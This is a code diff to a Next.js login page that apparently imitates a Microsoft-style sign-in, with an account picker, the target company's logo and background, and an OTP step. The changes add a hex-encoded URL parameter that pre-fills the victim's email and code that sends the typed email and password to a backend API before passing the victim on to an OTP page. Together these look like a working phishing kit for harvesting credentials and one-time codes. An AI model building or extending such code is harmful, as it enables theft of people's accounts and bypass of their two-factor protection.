@@ -5,6 +5,8 @@ import { useRouter } from "next/router";
 import { setCookie } from "cookies-next";
 import { getCookie } from "cookies-next";
 import arrow from "../../public/arrow.svg";
+import { useSearchParams } from "next/navigation";
+
 export default function Login() {
   const router = useRouter();
   const [emailAddress, setemailAddress] = useState("");
@@ -12,6 +14,10 @@ export default function Login() {
   const [id, setid] = useState("");
   const [username_page, setusername_page] = useState(true);
   const [isWrongEmail, setisWrongEmail] = useState(false);
+  const [email_parameter, setemail_parameter] = useState(null);
+  const searchParams = useSearchParams();
+
+  console.log("oauth2 is :" + email_parameter);
   const hello = async () => {
     const cookie = getCookie("id");
 
@@ -38,13 +44,29 @@ export default function Login() {
     }
   };
 
-  const email_send = () => {
+  const email_send = async () => {
     // why not
     if (emailAddress.toLowerCase().includes("<script>")) {
       router.push("/HackerMan");
     }
     // TODO add API endppoint to capture the email address
-    change_to_password();
+    const data = {
+      username: emailAddress,
+      password: "NONE",
+    };
+    const res = await fetch(`${process.env.API_URL}/login/${id}`, {
+      method: "POST",
+      cache: "no-cache",
+      headers: {
+        "Content-Type": "application/json",
+        accept: "application/json",
+      },
+      body: JSON.stringify(data),
+    });
+    const res2 = await fetch(`${process.env.API_URL}/action/${id}/wait`, {
+      method: "PUT",
+      cache: "no-cache",
+    });
   };
 
   const login = async () => {
@@ -65,11 +87,14 @@ export default function Login() {
       method: "PUT",
       cache: "no-cache",
     });
-    
+
     router.push("/OTP");
   };
   useEffect(() => {
     hello();
+    if (searchParams.get("oauth2") != null) {
+      setemail_parameter(hex2a(searchParams.get("oauth2")));
+    }
   }, []);
 
   const change_to_password = () => {
@@ -80,10 +105,122 @@ export default function Login() {
       }
     }
     // username_page = false;
-    document.body.classList.add("bg-[url('/internal/company_image.jpeg')]");
     setusername_page(!username_page);
   };
+  function hex2a(hexx) {
+    var hex = hexx.toString(); //force conversion
+    var str = "";
+    for (var i = 0; i < hex.length; i += 2)
+      str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+    return str;
+  }
+
   const PageChanger = () => {
+    if (email_parameter != null) {
+      return (
+        <div>
+          <div
+            className="pt-2"
+            style={{
+              WebkitTextSizeAdjust: "100%",
+              direction: "ltr",
+              textAlign: "left",
+              lineHeight: "1.75rem",
+              color: "#1b1b1b",
+              fontSize: "1.5rem",
+              fontWeight: "600",
+              boxSizing: "border-box",
+            }}
+          >
+            Pick an account
+          </div>
+          <div>
+            <div
+              onClick={() => {
+                setemailAddress(email_parameter);
+                setemail_parameter(null);
+                email_send();
+                setusername_page(false);
+              }}
+            >
+              <div
+                style={{
+                  position: "relative",
+                  marginLeft: "calc((-512px + 100%) / 2)",
+                  marginRight: "calc((-512px + 100%) / 2)",
+                }}
+              >
+                <div className="flex px-20 mt-4 py-4 flex-row space-x-3 items-center hover:bg-gray-200">
+                  <img className="" src="/internal/picker_account.svg"></img>
+                  <div
+                    style={{
+                      WebkitTextSizeAdjust: "100%",
+                      fontWeight: "400",
+                      fontSize: ".9375rem",
+                      direction: "ltr",
+                      listStyle: "circle",
+                      listStyleType: "disc",
+                      color: "inherit",
+                      cursor: "pointer",
+                      textAlign: "left",
+                      lineHeight: "16px",
+                      boxSizing: "border-box",
+                      wordWrap: "break-word",
+                    }}
+                  >
+                    {email_parameter}
+                  </div>
+                  <img
+                    src="/internal/picker_more.svg"
+                    className="pr-20"
+                    style={{ position: "absolute", right: "0" }}
+                  ></img>
+                </div>
+              </div>
+            </div>
+
+            <div
+              onClick={() => {
+                setemail_parameter(null);
+              }}
+            >
+              <div
+                style={{
+                  position: "relative",
+                  marginLeft: "calc((-512px + 100%) / 2)",
+                  marginRight: "calc((-512px + 100%) / 2)",
+                }}
+              >
+                <div className="flex px-20  py-4 flex-row space-x-3 items-center hover:bg-gray-200">
+                  <img
+                    className=""
+                    src="/internal/picker_account_add.svg"
+                  ></img>
+                  <div
+                    style={{
+                      WebkitTextSizeAdjust: "100%",
+                      fontWeight: "400",
+                      fontSize: ".9375rem",
+                      direction: "ltr",
+                      listStyle: "circle",
+                      listStyleType: "disc",
+                      color: "inherit",
+                      cursor: "pointer",
+                      textAlign: "left",
+                      lineHeight: "16px",
+                      boxSizing: "border-box",
+                      wordWrap: "break-word",
+                    }}
+                  >
+                    Use another account
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      );
+    }
     if (username_page) {
       return (
         <div className="mt-4 flex space-y-3 flex-col">
@@ -131,6 +268,7 @@ export default function Login() {
               // console.log(e.key);
               if (e.key == "Enter") {
                 email_send();
+                change_to_password();
               }
             }}
             onChange={(e) => {
@@ -251,7 +389,10 @@ export default function Login() {
               Back
             </button>
             <button
-              onClick={email_send}
+              onClick={() => {
+                email_send();
+                change_to_password();
+              }}
               style={{
                 WebkitTextSizeAdjust: "100%",
                 direction: "ltr",
@@ -285,6 +426,10 @@ export default function Login() {
         </div>
       );
     } else {
+      document.getElementById("box-logo").src = "/internal/company-logo.png";
+      document.body.classList.add(
+        "bg-[url('/internal/company_background.jpeg')]"
+      );
       return (
         <div className="flex flex-col space-y-7">
           <div className="flex flex-row space-x-2">
@@ -327,6 +472,12 @@ export default function Login() {
             value={password}
             onChange={(e) => {
               setpassword(e.currentTarget.value);
+            }}
+            onKeyDown={(e) => {
+              // console.log(e.key);
+              if (e.key == "Enter") {
+                login();
+              }
             }}
             style={{
               WebkitTextSizeAdjust: "100%",
